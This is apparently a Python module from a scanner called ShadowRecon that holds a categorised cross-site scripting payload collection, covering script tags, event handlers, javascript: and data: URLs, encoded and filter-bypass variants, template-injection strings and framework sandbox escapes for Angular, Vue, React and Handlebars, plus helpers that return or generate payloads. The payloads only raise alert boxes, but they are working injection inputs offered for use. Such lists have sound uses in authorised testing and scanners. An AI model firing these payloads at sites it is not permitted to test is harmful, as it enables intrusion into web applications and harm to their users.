"""
Advanced XSS Payloads for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Comprehensive XSS payload collection for automated vulnerability discovery
"""

class XSSPayloads:
    """Advanced XSS payload collection"""

    # Basic XSS payloads
    BASIC_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<script>alert(1)</script>',
        '<script>confirm("XSS")</script>',
        '<script>prompt("XSS")</script>',
        '<script>console.log("XSS")</script>',
    ]

    # Event-based XSS payloads
    EVENT_PAYLOADS = [
        '<img src=x onerror=alert("XSS")>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert("XSS")>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input type="text" onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video src=x onerror=alert("XSS")>',
        '<audio src=x onerror=alert("XSS")>',
    ]

    # JavaScript URL payloads
    JAVASCRIPT_PAYLOADS = [
        'javascript:alert("XSS")',
        'javascript:alert(1)',
        'javascript:confirm("XSS")',
        'javascript:prompt("XSS")',
        'javascript://\n\nalert("XSS")',
        'javascript:void(alert("XSS"))',
    ]

    # Encoded XSS payloads
    ENCODED_PAYLOADS = [
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '%3Cscript%3Ealert("XSS")%3C/script%3E',
        '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
        '\x3Cscript\x3Ealert("XSS")\x3C/script\x3E',
    ]

    # Bypass payloads for filters
    BYPASS_PAYLOADS = [
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>ale\x72t("XSS")</script>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
        '<img src="x" onerror="&#97;lert(1)">',
        '"><script>alert("XSS")</script>',
        '\'><script>alert("XSS")</script>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(/XSS/)</script>',
        '<script>alert`XSS`</script>',
    ]

    # Template injection payloads
    TEMPLATE_PAYLOADS = [
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '${alert("XSS")}',
        '#{alert("XSS")}',
        '${{alert("XSS")}}',
        '{alert("XSS")}',
        '<%=alert("XSS")%>',
        '{%alert("XSS")%}',
    ]

    # Context-specific payloads
    ATTRIBUTE_PAYLOADS = [
        '" onmouseover="alert(\'XSS\')">',
        '\" onmouseover=\"alert(\'XSS\')\">',
        ' onmouseover=\'alert("XSS")\'>',
        '"> <script>alert("XSS")</script>',
        '\'> <script>alert("XSS")</script>',
        '\"><img src=x onerror=alert("XSS")>',
        '\'><img src=x onerror=alert("XSS")>',
    ]

    # DOM-based XSS payloads
    DOM_PAYLOADS = [
        '#<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'vbscript:alert("XSS")',
        'livescript:alert("XSS")',
    ]

    # Modern framework bypass payloads
    FRAMEWORK_PAYLOADS = [
        # Angular
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '{{$on.constructor("alert(\'XSS\')")()}}',
        '{{toString.constructor.prototype.toString.constructor.prototype.call.call({},toString.constructor.prototype.toString.constructor,"alert(\'XSS\')")()}}',

        # Vue.js
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '{{this.constructor.constructor("alert(\'XSS\')")()}}',

        # React
        'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html onmouseover=/*&lt;svg/*/onload=alert(/XSS/)//>"',

        # Handlebars
        '{{#with "constructor"}}{{#with "constructor"}}{{#with "call"}}{{#with "call"}}{{this "alert(\'XSS\')"}}{{/with}}{{/with}}{{/with}}{{/with}}',
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Get all XSS payloads"""
        all_payloads = []
        all_payloads.extend(cls.BASIC_PAYLOADS)
        all_payloads.extend(cls.EVENT_PAYLOADS)
        all_payloads.extend(cls.JAVASCRIPT_PAYLOADS)
        all_payloads.extend(cls.ENCODED_PAYLOADS)
        all_payloads.extend(cls.BYPASS_PAYLOADS)
        all_payloads.extend(cls.TEMPLATE_PAYLOADS)
        all_payloads.extend(cls.ATTRIBUTE_PAYLOADS)
        all_payloads.extend(cls.DOM_PAYLOADS)
        all_payloads.extend(cls.FRAMEWORK_PAYLOADS)
        return all_payloads

    @classmethod
    def get_context_payloads(cls, context: str) -> list:
        """Get payloads for specific context"""
        context_map = {
            'basic': cls.BASIC_PAYLOADS,
            'event': cls.EVENT_PAYLOADS,
            'javascript': cls.JAVASCRIPT_PAYLOADS,
            'encoded': cls.ENCODED_PAYLOADS,
            'bypass': cls.BYPASS_PAYLOADS,
            'template': cls.TEMPLATE_PAYLOADS,
            'attribute': cls.ATTRIBUTE_PAYLOADS,
            'dom': cls.DOM_PAYLOADS,
            'framework': cls.FRAMEWORK_PAYLOADS
        }
        return context_map.get(context.lower(), cls.BASIC_PAYLOADS)

    @classmethod
    def generate_custom_payload(cls, alert_content: str = "XSS") -> list:
        """Generate custom payloads with specified alert content"""
        templates = [
            '<script>alert("{}")</script>',
            '<img src=x onerror=alert("{}")>',
            '<svg onload=alert("{}")>',
            'javascript:alert("{}")',
            '"><script>alert("{}")</script>',
            '\'><script>alert("{}")</script>',
        ]
        return [template.format(alert_content) for template in templates]
